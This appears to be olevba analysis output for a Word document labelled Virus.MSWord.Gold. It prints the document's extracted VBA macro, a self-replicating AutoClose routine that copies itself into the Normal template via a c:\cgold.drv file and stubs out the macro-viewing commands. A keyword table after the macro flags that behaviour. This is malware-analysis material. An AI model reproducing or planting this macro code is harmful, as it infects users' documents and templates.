olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gold-91522c858f52ef494f4da1b80d77814a16544911
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Gold-91522c858f52ef494f4da1b80d77814a16544911 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If nt > 16 And ad > 0 Then End
If nt < 16 Then Set host = NormalTemplate.VBProject.VBComponents.Item(1)
If nt < 16 Then ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\cgold.drv"
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
host.CodeModule.AddFromFile ("c:\cgold.drv")
host.CodeModule.deletelines 1, 4
If nt < 16 Then host.CodeModule.replaceline 1, "Sub AutoClose()"
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

